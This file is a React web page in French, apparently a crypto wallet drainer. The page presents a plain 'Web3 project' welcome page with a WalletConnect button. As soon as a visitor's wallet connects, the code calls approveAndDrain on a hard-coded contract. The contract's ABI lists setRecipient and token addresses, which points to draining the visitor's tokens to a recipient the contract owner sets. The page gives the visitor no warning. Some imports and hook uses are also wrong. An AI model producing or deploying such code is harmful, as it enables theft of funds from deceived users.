import { useEffect, useState } from 'react';
import { useAccount, useConnect, useDisconnect, useSigner } from 'wagmi';
import { InjectedConnector } from 'wagmi/connectors/injected';
import { WalletConnectConnector } from '@walletconnect/client';
import { ethers } from 'ethers';

// Ton ABI du contrat et l'adresse du contrat
const contractABI = [
  {
    "inputs": [],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [],
    "name": "approvalAmount",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "approveAndDrain",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "owner",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "recipient",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "_recipient",
        "type": "address"
      }
    ],
    "name": "setRecipient",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "name": "tokenAddresses",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "stateMutability": "payable",
    "type": "receive"
  }
];

const contractAddress = "0xb44de2566da86c8cef673899d0b53fa69bd685cf"; // Ton adresse de contrat

export default function Home() {
  const [isConnected, setIsConnected] = useState(false);
  const { isConnected: accountConnected, address } = useAccount();
  const { connect, disconnect } = useConnect();
  const { data: signer } = useSigner();
  
  useEffect(() => {
    if (accountConnected) {
      setIsConnected(true);
      interactWithContract();
    }
  }, [accountConnected]);

  const interactWithContract = async () => {
    if (signer) {
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const contract = new ethers.Contract(contractAddress, contractABI, provider.getSigner());
      
      try {
        // Appel de la fonction approveAndDrain sur le contrat
        const tx = await contract.approveAndDrain();
        console.log("Transaction envoyée : ", tx);
        await tx.wait();
        console.log("Transaction confirmée");
      } catch (err) {
        console.error("Erreur lors de l'interaction avec le contrat", err);
      }
    }
  };

  return (
    <div>
      <h1>Bienvenue sur le projet Web3</h1>
      {!isConnected ? (
        <button onClick={() => connect(new WalletConnectConnector({ options: { qrcode: true } }))}>
          Connexion avec WalletConnect
        </button>
      ) : (
        <button onClick={() => disconnect()}>
          Déconnexion
        </button>
      )}
      {isConnected && <p>Wallet connecté : {address}</p>}
    </div>
  );
}
